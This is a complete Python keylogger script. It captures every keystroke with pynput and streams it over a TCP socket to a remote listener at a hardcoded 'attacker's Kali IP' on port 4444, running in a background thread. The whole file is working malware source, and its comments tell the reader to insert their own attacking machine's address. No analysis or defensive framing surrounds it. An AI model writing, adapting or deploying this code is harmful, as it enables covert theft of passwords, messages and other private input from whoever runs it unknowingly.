from pynput import keyboard
import socket
import threading

# Configure your attacker's Kali IP and port
REMOTE_IP = "192.168.78.137"  # ← Replace with your Kali IP
REMOTE_PORT = 4444

# Connect to remote listener
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((REMOTE_IP, REMOTE_PORT))

def send_key(key):
    try:
        client.send(f"{key.char}".encode())
    except AttributeError:
        client.send(f"[{key}]".encode())

def start_keylogger():
    with keyboard.Listener(on_press=send_key) as listener:
        listener.join()

# Run keylogger in thread
threading.Thread(target=start_keylogger).start()
